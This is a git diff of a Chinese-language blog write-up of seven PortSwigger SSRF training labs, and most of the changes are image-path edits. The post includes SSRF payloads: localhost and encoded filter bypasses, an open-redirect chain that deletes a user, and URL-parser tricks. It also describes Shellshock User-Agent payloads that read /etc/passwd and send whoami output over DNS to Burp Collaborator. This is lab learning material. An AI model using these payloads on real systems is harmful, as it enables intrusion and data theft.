@@ -11,29 +11,29 @@ index_img: /img/default.png
 banner_img: /img/default.png
 ---
 ## Lab1: Basic SSRF against the local server
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325142213.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325142213.png)
 说库存检查功能有问题,去相关位置抓个包
 
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325142520.png)
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325142635.png)
-发到重放器,然后注意到有个stockApi,再发到编码区看看
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325142807.png)
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325142851.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325142520.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325142635.png)
+发到重放器,然后注意到有个`stockApi`,再发到编码区看看
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325142807.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325142851.png)
 根据题目，将stockApi参数中的URL更改为`http://localhost/admin`，这样就把URL交给服务端访问，服务端的localhost请求就来着本地，这样就进入了管理页面
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325143510.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325143510.png)
 可以看到出现删除carlos用户，查看这个删除按钮的代码
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325143725.png)
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325144019.png)
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325143927.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325143725.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325144019.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325143927.png)
 跟踪重定向成功完成
 
 
 ## Lab2: Basic SSRF against another back-end system
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325144244.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325144244.png)
 那么admin就在`192.168.0.X:8080/admin`，其中`X`不知道需要扫出来
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325144759.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325144759.png)
 解码查看
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325144844.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325144844.png)
 ```
 http://192.168.0.1:8080/product/stock/check?productId=5&storeId=1
 ```
@@ -41,36 +41,36 @@ http://192.168.0.1:8080/product/stock/check?productId=5&storeId=1
 ```
 192.168.0.X:8080/admin
 ```
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145030.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325145030.png)
 那爆破`X`，`Ctrl+I`发送到攻击器爆破
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145249.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325145249.png)
 筛选一下可以看到120是响应200
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145443.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325145443.png)
 进到管理页面找到删除功能
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145556.png)
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145639.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325145556.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325145639.png)
 成功删除
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145909.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325145909.png)
 
 
 ## Lab3: Blind SSRF with out-of-band detection
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325150626.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325150626.png)
 随便点开一个页面抓包
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325150814.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325150814.png)
 发重发器，`Referer`按要求将原始域名替换为 Burp Collaborator 生成的域名
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325151025.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325151025.png)
 如果没有成功，等几秒钟再试一次，因为服务器端命令是异步执行的
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325151317.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325151317.png)
 这里可以看到访问信息
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325151617.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325151617.png)
 
 
 ## Lab4: SSRF with blacklist-based input filter
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325151747.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325151747.png)
 还是库存检查功能问题，但有黑名单，先随便进一个网页抓包发到重发器
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325153038.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325153038.png)
 不出意外被过滤了
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325153252.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325153252.png)
 无疑是`localhost`或者`admin`被过滤了
 `localhost`可以换成`127.0.0.1`,`127.1`
 `admin`可以通过`URL`编码
@@ -87,28 +87,28 @@ stockApi=http://127.1/%61%64%6d%69%6e
 URL编码两次(成功)
 stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
 ```
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325153910.png)
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325154534.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325153910.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325154534.png)
 
 最后，找到删除按钮的代码传过去
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325154702.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325154702.png)
 点一下重定向跟踪，完成实验
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325154747.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325154747.png)
 
 
 ## Lab5: SSRF with filter bypass via open redirection vulnerability
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325160423.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325160423.png)
 先随便进一个网页抓包发到重发器
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325160601.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325160601.png)
 直接把api改成`http://192.168.0.12:8080/admin`肯定是不行的，只能从本地应用获取
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325160732.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325160732.png)
 从其他包找突破口，在每次点击下一页的时候发现都有一次重定向
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325161126.png)
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325161154.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325161126.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325161154.png)
 发现这个包是GET传参，头部控制重定向地址，这个可以利用一下
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325161354.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325161354.png)
 让检查库存的api去访问这样一个地址,那这个地址对于网站来说肯定是属于内部，尝试看看
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325162037.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325162037.png)
 成功，注意要URL编码
 那下面我们控制其中的参数，让其重定向地址到我们的`http://192.168.0.12:8080/admin`
 ```
@@ -117,17 +117,17 @@ stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/a
 //URL编码
 stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin
 ```
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325162355.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325162355.png)
 成功进入管理页面，最后找到删除`carlos`功能按钮代码，写入`stockApi`
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325162448.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325162448.png)
 ```
 stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos
 ```
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260325162727.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260325162727.png)
 
 
 ## Lab6: Blind SSRF with Shellshock exploitation
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326102700.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326102700.png)
 先了解下`Shellshock`漏洞原理,学习博客参考:
 ```
 https://www.freebuf.com/articles/system/279713.html
@@ -139,15 +139,15 @@ User-Agent: () { :; }; echo; /bin/cat /etc/passwd
 `() { :; };`后面为我们要接的命令
 
 下面对实验室其中一个产品进行抓包,发到重发器
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326105104.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326105104.png)
 按实验说明，`Referer`是存放URL的，`192.168.0.X`中的`X`不知道需要爆破，发送到攻击器
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326105859.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326105859.png)
 
 `User-Agent`是我们的突破点，现在的问题是我们构造怎样的payload拿到用户名
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326105201.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326105201.png)
 
 实验描述是盲 `SSRF` 攻击，没有回显，为了看到命令执行的结果，我们需要让目标服务器主动把数据送到我们控制的公网服务器上，结合利用 DNS 协议进行数据外带的方法
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326111758.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326111758.png)
 Burp Collaborator 的默认公共服务器
 
 结合`Shellshock`漏洞
@@ -157,7 +157,7 @@ Burp Collaborator 的默认公共服务器
 **`$(whoami)`**：这是 Linux/Bash 中的命令替换语法。系统会优先执行括号内的 `whoami` 命令（该命令的作用是输出当前运行该进程的操作系统用户名），然后将其输出结果填补回原来的位置。假设当前运行的用户是 `peter`，那么 `$(whoami)` 就会被替换成 `peter`
 
 后面的就是Burp Collaborator 的默认公共服务器
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326111947.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326111947.png)
 **完整的执行流程：**
 
 1. 通过 SSRF 配合 Shellshock 漏洞，你成功让后端服务器执行了这段代码。
@@ -190,19 +190,19 @@ Priority: u=0, i
 
 ```
 爆破
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326112853.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326112853.png)
 在协作器成功得到用户名`peter-S8Ob7W`
 
 
 ## Lab7: SSRF with whitelist-based input filter
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326141612.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326141612.png)
 还是库存检查功能有问题，实验描述是白名单，先在库存检查处抓包看看，发到重发器
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326141826.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326141826.png)
 `URL`解码看看`stockApi`，尝试换成实验给的`http://localhost/admin`
 ```
 stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
 ```
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326142105.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326142105.png)
 强制要求 URL 的主机名（Host）部分必须完全匹配`stock.weliketoshop.net`
 
 1. 利用 URL 的凭证语法 (`@`)
@@ -255,8 +255,8 @@ http://localhost%23@stock.weliketoshop.net/admin
 http://localhost#@stock.weliketoshop.net/admin
 ```
 此时它解析到的结构变成了以 `localhost` 为主机，成功向本地接口发起了请求。
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326143557.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326143557.png)
 成功进入管理页面，后面找到删除`carlos`的代码即可
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326143718.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326143718.png)
 跟踪重定向,最后一个`SSRF`实验完成
-![](/img/PortSwigger-SSRF/Pasted%20image%2020260326143753.png)
+![](../img/PortSwigger-SSRF/PortSwigger-SSRF-20260326143753.png)
